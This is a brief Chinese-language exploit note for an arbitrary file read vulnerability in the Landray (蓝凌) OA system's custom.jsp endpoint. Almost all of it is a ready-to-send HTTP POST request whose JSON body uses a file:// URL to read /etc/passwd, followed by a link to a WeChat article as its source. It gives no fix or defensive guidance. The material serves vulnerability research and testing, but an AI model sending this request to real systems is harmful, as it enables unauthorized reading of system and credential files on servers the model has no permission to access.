# 蓝凌OA custom.jsp 任意文件读取漏洞

漏洞利用

出现漏洞的文件為 custom.jsp, 请求包如下：

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={"body":{"file":"file:///etc/passwd"}}
```


ref:https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw